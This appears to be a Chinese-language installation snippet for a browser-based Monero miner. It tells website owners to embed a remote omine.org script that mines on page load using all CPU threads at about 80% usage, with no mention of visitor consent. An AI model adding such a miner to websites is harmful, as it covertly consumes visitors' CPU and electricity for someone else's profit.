原始碼 (安裝)

將這五行代碼嵌入您的網站 (記得將 "yourAddress#RigID" 更換為您的地址以及 RigID) 即可開始挖礦！

<script src="https://xmr.omine.org/assets/v7.js"></script>

  <script>

    OMINE("yourAddress#RigID","-1"); //-1 means use all cpu threads
    throttleMiner=20; //20 means 80% of cpu usage

  </script>
